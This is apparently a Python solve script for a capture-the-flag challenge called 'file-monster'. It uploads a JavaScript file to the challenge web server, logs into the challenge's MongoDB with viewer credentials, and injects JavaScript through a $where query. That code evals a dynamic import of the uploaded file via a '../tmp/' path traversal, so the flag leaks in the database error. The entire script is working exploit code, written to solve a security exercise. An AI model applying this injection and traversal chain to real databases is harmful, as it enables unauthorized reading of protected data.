#!/usr/bin/env python3

import os
import re
import secrets
import sys

import requests
from bson.code import Code
from pymongo import MongoClient, errors


WEB = os.environ.get(
    "WEB",
    "https://file-monster-bac4c2e3fb1d.chall.nnsc.tf",
).rstrip("/")
MONGO = os.environ.get(
    "MONGO",
    "file-monster-db-bac4c2e3fb1d.chall.nnsc.tf",
)
FLAG_RE = re.compile(r"NNS\{[^}]+\}")


def upload(session, name, content):
    response = session.post(
        f"{WEB}/upload",
        files={"file": (name, content)},
        timeout=10,
    )
    response.raise_for_status()
    data = response.json()
    if not data.get("ok"):
        raise RuntimeError(f"upload failed: {data}")


def main():
    tag = secrets.token_hex(4)
    module_name = f"Probe{tag}.js"
    trigger_name = f"Trigger{tag}.txt"

    session = requests.Session()
    session.verify = False
    upload(session, module_name, b"throw /FLAG/")
    upload(session, trigger_name, b"trigger")

    client = MongoClient(
        MONGO,
        1337,
        tls=True,
        directConnection=True,
        username="viewer",
        password="viewer",
        authSource="file-monster",
        serverSelectionTimeoutMS=7000,
        socketTimeoutMS=15000,
    )
    db = client["file-monster"]

    # The first $where invocation starts the module import. Mongo runs the
    # Promise rejection before invoking $where for the next document.
    js = (
        "function(){"
        "if(typeof globalThis.started==='undefined'){"
        "globalThis.started=true;"
        "eval(\"import('../tmp/"
        + module_name
        + "')\").then(function(){"
        "globalThis.ok='unexpected';"
        "},function(e){globalThis.err=String(e);});"
        "return true;"
        "}"
        "throw new Error(globalThis.err||'module import did not settle');"
        "}"
    )

    try:
        db.command({"find": "files", "filter": {"$where": Code(js)}})
    except errors.OperationFailure as exc:
        match = FLAG_RE.search(str(exc))
        if match:
            print(f"<FLAG>{match.group(0)}</FLAG>")
            return
        raise RuntimeError(f"unexpected Mongo response: {exc}") from exc
    raise RuntimeError("$where completed without returning the flag")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        sys.exit(1)
